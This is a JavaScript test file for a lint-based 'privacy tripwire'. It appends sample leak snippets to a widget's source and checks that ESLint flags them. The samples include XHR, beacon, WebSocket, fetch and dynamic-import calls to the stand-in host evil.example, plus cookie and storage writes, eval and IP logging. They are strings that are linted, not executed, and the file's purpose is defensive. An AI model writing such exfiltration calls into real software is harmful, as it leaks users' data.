import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { ESLint } from 'eslint';

const ROOT = new URL('../../../', import.meta.url).pathname;
const eslint = new ESLint({ cwd: ROOT });
const widget = fs.readFileSync(new URL('../src/widget.js', import.meta.url), 'utf8');

const lintAs = async (code, file) => (await eslint.lintText(code, { filePath: ROOT + file }))[0].messages.filter((m) => m.severity === 2);

test('the shipped widget passes the privacy tripwire', async () => {
  assert.deepEqual(await lintAs(widget, 'packages/doorway/src/widget.js'), []);
});

// The exact leaks the review appended to widget.js, all of which the old
// line-regex gate passed: XHR, an Image beacon, a stray localStorage key, and a
// fetch to an off-domain URL.
const LEAKS = {
  XMLHttpRequest: "export function leak(){ const x = new XMLHttpRequest(); x.open('POST','https://evil.example'); x.send('q'); }",
  'Image beacon': "export function leak(){ new Image().src = 'https://evil.example/p.gif?u=1'; }",
  'img element': "export function leak(d){ const i = d.createElement('img'); i.src = 'https://evil.example/p.gif'; }",
  sendBeacon: "export function leak(){ navigator.sendBeacon('https://evil.example', 'q'); }",
  cookie: "export function leak(){ document.cookie = 'uid=1'; }",
  WebSocket: "export function leak(){ return new WebSocket('wss://evil.example'); }",
  'off-domain fetch': "export function leak(){ return fetch('https://evil.example/collect'); }",
  eval: "export function leak(s){ return eval(s); }",
  sessionStorage: "export function leak(){ sessionStorage.setItem('uid','1'); }",
  geolocation: "export function leak(){ navigator.geolocation.getCurrentPosition(()=>{}); }",
  'dynamic import': "export const leak = () => import('https://evil.example/x.js');",
};

for (const [name, code] of Object.entries(LEAKS)) {
  test(`tripwire: ${name} is caught in the widget`, async () => {
    const msgs = await lintAs(widget + '\n' + code, 'packages/doorway/src/widget.js');
    assert.ok(msgs.length > 0, `${name} was not caught`);
  });
}

test('tripwire: a stray localStorage key in a file that may not touch storage is caught', async () => {
  const msgs = await lintAs("export const leak = () => localStorage.setItem('uid','1');", 'packages/doorway/src/copy.js');
  assert.ok(msgs.length > 0);
});

test('the edge never logs', async () => {
  const msgs = await lintAs("export const leak = (r) => console.log(r.headers.get('cf-connecting-ip'));", 'edge/c.js');
  assert.ok(msgs.length > 0);
});
